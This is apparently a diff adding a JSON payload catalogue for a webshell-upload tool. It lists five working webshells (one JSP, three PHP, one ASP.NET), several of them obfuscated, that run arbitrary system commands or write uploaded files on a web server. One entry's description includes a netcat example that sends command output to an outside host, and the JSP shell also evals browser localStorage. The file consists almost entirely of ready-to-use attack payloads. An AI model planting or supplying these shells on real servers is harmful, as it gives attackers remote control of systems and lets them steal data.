@@ -1,0 +1,157 @@
+[
+    {
+        "id": 1,
+        "name": "JSP Webshell",
+        "language": [
+            "java"
+        ],
+        "required_sp_chars": [
+            "ALPHANUMERIC",
+            "SPACE",
+            "'",
+            ";",
+            "\"",
+            "/",
+            ".",
+            "=",
+            "(",
+            ")",
+            "}",
+            "{",
+            "%",
+            "<",
+            ">"
+        ],
+        "capabilities": [
+            "OUTPUT_INBAND",
+            "UPLOAD",
+            "COMMAND_EXECUTION"
+        ],
+        "description": "Simple Webshell written in JSP that can be used to upload files and execute commands (from sra.io)",
+        "payload": "<%@page import=\\\"java.io.*, java.util.*, javax.xml.bind.*, java.net.*\\\"%><script>eval(window.localStorage.embed)</script><%!public String v(String w){String x=\\\"\\\";try{x=URLDecoder.decode(w,\\\"UTF-8\\\");}catch(Exception e){}return x;}%><%String o,l,d;o=l=d=\\\"\\\";DataInputStream r=new DataInputStream(request.getInputStream());while((l=r.readLine())!=null){d+=l;}if(d.indexOf(\\\"c=\\\")>=0){String g=v(d.substring(2));String s;try{Process p=Runtime.getRuntime().exec(g);DataInputStream i=new DataInputStream(p.getInputStream());out.print(\\\"<pre>\\\");while((s=i.readLine())!=null){o+=s.replace(\\\"<\\\",\\\"&lt;\\\").replace(\\\">\\\",\\\"&gt;\\\")+\\\"<br>\\\";}}catch(Exception e){out.print(e);}}else{if(d.length()>1){int b=d.indexOf(\\\"b=\\\");int n=d.indexOf(\\\"n=\\\");byte[] m=DatatypeConverter.parseBase64Binary(v(d.substring(b+2)));String f=v(d.substring(2,n-1))+File.separator+v(d.substring(n+2,b-1));try{OutputStream stream=new FileOutputStream(f);stream.write(m);o=\\\"Uploaded: \\\"+f;}catch(Exception e){out.print(e);}}}%><%=o%>"
+    },
+    {
+        "id": 2,
+        "name": "Php - obfusctated GET v1 extended",
+        "language": [
+            "php"
+        ],
+        "required_sp_chars": [
+            "'",
+            ";",
+            "\"",
+            "/",
+            ".",
+            "$",
+            "=",
+            "(",
+            ")",
+            "}",
+            "{",
+            "%",
+            "<",
+            ">",
+            "_",
+            "[",
+            "]",
+            "^"
+        ],
+        "capabilities": [
+            "CODE_EXECUTION",
+            "OUTPUT_INBAND"
+        ],
+        "description": "Obfuscated php webshell that can be used to execute arbitrary php functions ?_=function&__=argument | e.g. domain.com?_=system&__=ls",
+        "payload": "<?php $_=\\\"{\\\"; $_=($_^\\\"<\\\").($_^\\\">;\\\").($_^\\\"/\\\");?><?=${'_'.$_}['_'](${'_'.$_}['__']);?>"
+    },
+    {
+        "id": 3,
+        "name": "Php - obfuscated GET",
+        "language": [
+            "php"
+        ],
+        "required_sp_chars": [
+            "ALPHANUMERIC",
+            "SPACE",
+            "'",
+            ";",
+            "\"",
+            "/",
+            ".",
+            "$",
+            "=",
+            "(",
+            ")",
+            "}",
+            "{",
+            "%",
+            "<",
+            ">",
+            "_",
+            "[",
+            "]",
+            "^",
+            "+",
+            "*"
+        ],
+        "capabilities": [
+            "COMMAND_EXECUTION",
+            "OUTPUT_INBAND"
+        ],
+        "description": "Obfuscated php webshell that can be used to execute arbitrary system commands ?0=ls | e.g. domain.com?0=ls",
+        "payload": "<?=$_=\\\"\\\";$_=\\\"'\\\" ;$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?>"
+    },
+    {
+        "id": 4,
+        "name": "Php minimal blind Webshell",
+        "language": [
+            "php"
+        ],
+        "required_sp_chars": [
+            "NUMERIC",
+            "$",
+            "_",
+            "[",
+            "]",
+            "`"
+        ],
+        "capabilities": [
+            "COMMAND_EXECUTE"
+        ],
+        "description": "Minimal webshell with no output. ?0=id | nc -nv domain.com 80",
+        "payload": "<?`$_GET[0]`?>"
+    },
+    {
+        "id": 5,
+        "name": "ASP webshell",
+        "language": [
+            "csharp"
+        ],
+        "required_sp_chars": [
+            "ALPHANUMERIC",
+            "<",
+            "%",
+            "@",
+            "/",
+            "\"",
+            "'",
+            ">",
+            "(",
+            ")",
+            "[",
+            "]",
+            "{",
+            "}",
+            "/",
+            "+",
+            ";",
+            "=",
+            ":"
+        ],
+        "capabilities": [
+            "COMMAND_EXECUTE",
+            "OUTPUT_INBAND"
+        ],
+        "description": "ASP webshell that can be used to execute arbitrary system commands through cmd.exe (from awen)",
+        "payload": "<%@ Page Language=\\\"C#\\\" Debug=\\\"true\\\" Trace=\\\"false\\\" %><%@ Import Namespace=\\\"System.Diagnostics\\\" %><%@ Import Namespace=\\\"System.IO\\\" %><script Language=\\\"c#\\\" runat=\\\"server\\\"> void Page_Load(object sender, EventArgs e) { } string ExcuteCmd(string arg) { ProcessStartInfo psi = new ProcessStartInfo(); psi.FileName = \\\"cmd.exe\\\"; psi.Arguments = \\\"/c \\\"+arg; psi.RedirectStandardOutput = true; psi.UseShellExecute = false; Process p = Process.Start(psi); StreamReader stmrdr = p.StandardOutput; string s = stmrdr.ReadToEnd(); stmrdr.Close(); return s; } void cmdExe_Click(object sender, System.EventArgs e) { Response.Write(\\\"<pre>\\\"); Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text))); Response.Write(\\\"</pre>\\\"); } </script><HTML><HEAD><title>asp.net</title></HEAD><body ><form id=\\\"cmd\\\" method=\\\"post\\\" runat=\\\"server\\\"><asp:TextBox id=\\\"txtArg\\\" style=\\\"Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px\\\" runat=\\\"server\\\" Width=\\\"250px\\\"></asp:TextBox><asp:Button id=\\\"testing\\\" style=\\\"Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px\\\" runat=\\\"server\\\" Text=\\\"execute\\\" OnClick=\\\"cmdExe_Click\\\"></asp:Button><asp:Label id=\\\"lblText\\\" style=\\\"Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px\\\" runat=\\\"server\\\">Command:</asp:Label></form></body></HTML>"
+    }
+]
